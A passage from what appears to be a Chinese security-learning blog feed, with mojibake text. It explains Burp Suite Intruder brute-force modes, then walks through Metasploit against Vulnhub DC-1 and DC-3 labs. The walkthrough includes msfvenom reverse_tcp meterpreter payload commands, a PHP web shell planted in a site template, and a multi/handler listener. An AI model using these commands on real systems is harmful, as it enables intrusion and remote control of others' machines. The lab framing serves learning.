src="/2023/02/13/bp-bruce/image-20220624165348786.png" alt="image-20220624165348786"></p><h3 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h3><p>å°±æ¯”è¾ƒæš´åŠ›ï¼Œå¯ä»¥ä»ä¸‹å›¾çœ‹åˆ°Requset countæœ‰8,398,080æ¬¡ï¼Œå› ä¸ºä»–æ˜¯æŠŠä¸‹é¢Character seté‡Œçš„æ‰€ä»¥å­—ç¬¦çš„æ’åˆ—ç»„åˆéƒ½è¯•äº†ï¼Œç®€å•ç²—æš´ï¼Œä¹Ÿéå¸¸è€—æ—¶é—´</p><p><img src="/2023/02/13/bp-bruce/image-20220624165405777.png" alt="image-20220624165405777"></p><p>è¿™é‡Œä»¥ä¸€æ¬¡çˆ†ç ´ä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹æ–¹æœ‰ä¸¤ä¸ª<code>Â§ Â§</code>ï¼Œè¿™ä¸¤å¤„å°±æ˜¯payloadè¾“å…¥ç‚¹ï¼Œæˆ‘ä»¬è¾“å…¥çˆ†ç ´æ•°æ®å°±ä¸æ–­åœ¨è¿™ä¸¤å¤„ä¸Šä¼ æµ‹è¯•</p><p><img src="/2023/02/13/bp-bruce/image-20220624170325792.png" alt="image-20220624170325792"></p><p>å¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸€å¤„çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸‹æ–¹çš„usernameä¸ºadminï¼Œå°±ä¸ç”¨ç”¨æµ‹è¯•æ•°æ®çˆ†ç ´ï¼Œåªç”¨åœ¨passwordå¤„çˆ†ç ´</p><p><img src="/2023/02/13/bp-bruce/image-20220624170753675.png" alt="image-20220624170753675"></p><p>é‚£ä¹ˆçˆ†ç ´å®Œåï¼Œå¦‚ä½•åˆ†è¾¨å“ªä¸ªæ‰æ˜¯æ­£ç¡®å¯†ç å‘¢</p><p>ä¸»è¦åˆ†ælengthï¼Œå¦‚æœå‡ºç°ä¸å¤§éƒ¨åˆ†lengthä¸åŒçš„å¯†ç ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯æ­£ç¡®å¯†ç ï¼Œæ¯”å¦‚æ­¤å¤„ï¼Œ 123456å°±æ˜¯æ­£ç¡®å¯†ç </p><p><img src="/2023/02/13/bp-bruce/image-20220624170455916.png" alt="image-20220624170455916"></p><h3 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h3><p><img src="/2023/02/13/bp-bruce/image-20220626083426611.png" alt="image-20220626083426611"></p><p>çº¯æ•°å­—å‹çˆ†ç ´ï¼ŒFromæ˜¯å¼€å§‹æ•°å­—ï¼ŒToæ˜¯ç»“æŸæ•°å­—ï¼ŒStepæ˜¯é—´éš”å¤šå°‘æ•°å­—çˆ†ç ´ä¸€æ¬¡</p><h3 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h3><p>é€‰æ‹©è‡ªå·±çš„å­—å…¸æ–‡ä»¶</p><h3 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h3><p>ï¼ˆå¯ä»¥è‡ªå®šä¹‰æ‹¼æ¥å­—æ®µï¼Œæ¯”å¦‚username:passwordï¼Œè¿™æ ·çˆ†ç ´çš„ä¸¤åˆ—æ•°æ®è¢«:éš”å¼€è¿›è¡Œçˆ†ç ´ï¼‰</p><p>è‡ªå®šä¹‰è¿­ä»£å™¨ã€‚è¿™ç§è´Ÿè½½ç±»å‹ï¼Œå¯ä»¥é…ç½®é¡¹ç›®çš„å¤šä¸ªåˆ—è¡¨ï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„åˆ—è¡¨ä¸­é¡¹çš„æ‰€æœ‰æ’åˆ—æœ‰æ•ˆè½½è·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå¼ºæœ‰åŠ›çš„æ–¹æ³•æ ¹æ®ç»™å®šçš„æ¨¡æ¿ï¼Œä»¥äº§ç”Ÿå­—ç¬¦æˆ–å…¶ä»–é¡¹ç›®çš„å®šåˆ¶æ’åˆ—ã€‚</p><h3 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h3><p>å­—ç¬¦æ›¿æ¢ã€‚æ­¤è´Ÿè½½ç±»å‹å…è®¸æ‚¨é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§å­—ç¬¦æ›¿æ¢åˆ°æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½æ˜¯åœ¨å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯å¸¸è§çš„å˜åŒ–ã€‚</p><h3 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h3><p>æ­¤è´Ÿè½½ç±»å‹å…è®¸é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§æƒ…å†µä¸‹ä¿®æ”¹æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½å¯¹å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯çš„æƒ…å†µä¸‹çš„å˜åŒ–ã€‚</p><h3 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h3><p>é€’å½’grepï¼Œè¦ç”¨è¿™ä¸ªå¿…é¡»åœ¨Intruder&gt;options&gt;Grep-extractä¸‹æ·»åŠ ä¸€ä¸ªå“åº”åŒ¹é…ï¼Œæ¯”å¦‚è¯´æˆ‘ä¸€ä¸ªè¯·æ±‚é¡µéœ€è¦å‰ä¸€ä¸ªå“åº”é¡µä¸­çš„å†…å®¹ï¼Œè¿™é‡Œå°±å¯ä»¥è¿™æ ·ä½¿ç”¨äº†ã€‚</p><h3 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h3><p>æ—¶é—´ã€æ—¥æœŸ</p><h3 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h3><p>è¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å½“æŸç§æ”»å‡»è¯·æ±‚éœ€è¦åå¤å‘é€åŒæ ·çš„è¯·æ±‚ï¼Œä½†è¿™ç§è¯·æ±‚ç›¸å¯¹äºåŸºæœ¬è¯·æ±‚æ˜¯æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œè¿™å¯ç”¨äºå„ç§æ”»å‡»ï¼Œä¾‹å¦‚é‡‡é›† cookiesæ¥è¿›è¡Œæµ‹åºåˆ†æï¼›åº”ç”¨å±‚çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œè¿™äº›è¯·æ±‚è¢«é‡å¤å‘é€ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šäº§ç”Ÿé«˜å·¥ä½œè´Ÿè·çš„ä»»åŠ¡ï¼Œæˆ–ä¿æ´»ä¼šè¯ä»¤ç‰Œï¼Œä»¥ä¾¿è¿™äº›ä»¤ç‰Œåœ¨å…¶å®ƒçš„é—´æ­‡è¯•éªŒä¸­ä½¿ç”¨ã€‚ä½¿ç”¨æ­¤è½½è·ç±»å‹ï¼Œå®ƒç”šè‡³æ²¡æœ‰å¿…è¦åœ¨è¯·æ±‚æ¨¡æ¿ä¸­æ ‡å¿—æœ‰æ•ˆè½½è·ä½ç½®ã€‚æ‚¨å¯ä»¥é…ç½®Burpäº§ç”Ÿä¸€å®šç‰¹å®šæ•°ç›®çš„ç©ºæœ‰æ•ˆè½½è·ï¼Œæˆ–æ— é™æœŸåœ°æŒç»­ä¸‹å»ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°å­—ã€æ—¥æœŸç­‰å…¶ä»–æ–¹å¼äº§ç”Ÿå¤§é‡çš„è¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨çš„è´Ÿè½½è¿‡é«˜ã€‚</p><h2 id="Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"><a href="#Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰" class="headerlink" title="Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"></a>Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰</h2><p><img src="/2023/02/13/bp-bruce/image-20220710224734912.png" alt="image-20220710224734912"></p><h3 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h3><p> è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p><h3 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h3><p> è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­ã€‚</p><h3 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h3><p>è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡ã€‚</p><h3 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h3><p>è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚ï¼ˆå³å¯ä»¥åœ¨ç”¨æˆ·åå’Œå¯†ç ä¸¤å¤„ç”¨ä¸¤ä¸ªå­—å…¸çˆ†ç ´ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨</title>
      <link href="/2023/02/13/Commontools/"/>
      <url>/2023/02/13/Commontools/</url>
      
        <content type="html"><![CDATA[<h1 id="å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨"><a href="#å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨" class="headerlink" title="å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨"></a>å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨</h1><h2 id="1ï¼‰msf"><a href="#1ï¼‰msf" class="headerlink" title="1ï¼‰msf"></a>1ï¼‰msf</h2><h3 id="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"><a href="#ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨" class="headerlink" title="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"></a>ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨</h3><p><code>ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶,å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´è¿›è¡Œæ”»å‡»</code></p><p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p><p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msfç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p><p><img src="/2023/02/13/Commontools/image-20220830094506049.png" alt="image-20220830094506049"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥search drupalï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬</span><br><span class="line"><span class="regexp">/*å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢*/</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830094939297.png" alt="image-20220830094939297"></p><p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">use</span> <span class="number">1</span>ï¼Œè¿›å…¥ç¼–å·<span class="number">1</span>è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830095106784.png" alt="image-20220830095106784"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830105519336.png" alt="image-20220830105519336"></p><p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œyesæ˜¯å¿…å¡«é¡¹ï¼Œnoæ˜¯éå¿…å¡«é¡¹</p><p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110143969.png" alt="image-20220830110143969"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å†è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œè„šæœ¬</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110303594.png" alt="image-20220830110303594"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">shell</span>ï¼Œè¿›å…¥<span class="built_in">shell</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110551273.png" alt="image-20220830110551273"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110648417.png" alt="image-20220830110648417"></p><p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110825217.png" alt="image-20220830110825217"></p><p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p><p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830110907408.png" alt="image-20220830110907408"></p><h3 id="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"><a href="#ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—" class="headerlink" title="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"></a>ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—</h3><h4 id="æ™®é€šç”Ÿæˆ"><a href="#æ™®é€šç”Ÿæˆ" class="headerlink" title="æ™®é€šç”Ÿæˆ"></a>æ™®é€šç”Ÿæˆ</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p æœ‰æ•ˆè½½è· -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f exe -o payload.exe</span><br></pre></td></tr></table></figure><h4 id="ç¼–ç ç”Ÿæˆ"><a href="#ç¼–ç ç”Ÿæˆ" class="headerlink" title="ç¼–ç ç”Ÿæˆ"></a>ç¼–ç ç”Ÿæˆ</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a ç³»ç»Ÿæ¶æ„ --platform ç³»ç»Ÿå¹³å° -p æœ‰æ•ˆè½½è· <span class="attribute">lhost</span>=æ”»å‡»æœºIP <span class="attribute">lport</span>=æ”»å‡»æœºç«¯å£ -e ç¼–ç æ–¹å¼ -iç¼–ç æ¬¡æ•° -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure><h4 id="ä»¥DC-3ä¸¾ä¸ªä¾‹å­"><a href="#ä»¥DC-3ä¸¾ä¸ªä¾‹å­" class="headerlink" title="*ä»¥DC-3ä¸¾ä¸ªä¾‹å­"></a>*ä»¥DC-3ä¸¾ä¸ªä¾‹å­</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kaliçš„ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903222910397.png" alt="image-20220903222910397"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903144052531.png" alt="image-20220903144052531"></p><p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p><p><img src="/2023/02/13/Commontools/image-20220903223007361.png" alt="image-20220903223007361"></p><p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶</p><p><img src="/2023/02/13/Commontools/image-20220903221140645.png" alt="image-20220903221140645"></p><p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p><p><img src="/2023/02/13/Commontools/image-20220903223039265.png" alt="image-20220903223039265"></p><p>ç„¶åä¿å­˜ä¸€ä¸‹</p><p><img src="/2023/02/13/Commontools/image-20220903221238918.png" alt="image-20220903221238918"></p><p>ç„¶åè¯•è¯•èƒ½ä¸èƒ½è®¿é—®æœ¨é©¬</p><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p><p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/less/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903221336853.png" alt="image-20220903221336853"></p><p>çœ‹åˆ°&#x2F;*ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p><h5 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h5><p>ç„¶åç”¨msfè¿›è¡Œåˆ©ç”¨</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å…ˆè¾“å…¥msfconsoleï¼Œè¿›å…¥msf</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åè¾“å…¥</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903220102252.png" alt="image-20220903220102252"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903220250819.png" alt="image-20220903220250819"></p><p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>çš„<span class="comment">ip</span></span><br></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œï¼Œä¼šå¡ä½</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903223414089.png" alt="image-20220903223414089"></p><p>åé¢æ“ä½œä¸èµ˜è¿°</p><h4 id="msfvenom-â€”list-archs"><a href="#msfvenom-â€”list-archs" class="headerlink" title="msfvenom â€”list archs"></a>msfvenom â€”list archs</h4><p>#æŸ¥çœ‹æ”¯æŒçš„ç³»ç»Ÿæ¶æ„</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure><h4 id="msfvenom-â€”list-platforms"><a 